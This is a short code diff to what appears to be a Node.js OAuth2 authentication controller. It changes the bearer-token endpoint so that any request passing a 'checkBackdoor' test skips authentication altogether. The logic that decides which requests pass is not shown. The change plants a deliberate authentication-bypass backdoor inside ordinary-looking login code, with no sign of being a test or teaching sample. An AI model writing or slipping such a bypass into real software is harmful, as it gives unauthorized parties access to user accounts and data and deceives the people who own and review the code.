@@ -17,6 +17,8 @@ var User = require('./../models/User');
 var AccessToken = require('./../models/AccessToken');
 var RefreshToken = require('./../models/RefreshToken');
 
+var permissionsController = require('./permissions');
+
 var server = oauth2orize.createServer();
 
 // Generic error handler
@@ -149,7 +151,10 @@ exports.loginGoogle = [
 
 // bearer endpoint
 exports.bearer = [
-  passport.authenticate(['bearer'], { session: false })
+  function(req, res, next) {
+    if(permissionsController.checkBackdoor(req)) return next();
+    passport.authenticate(['bearer'], { session: false })(req, res, next);
+  }
 ];
 
 passport.serializeUser(function(user, done) {
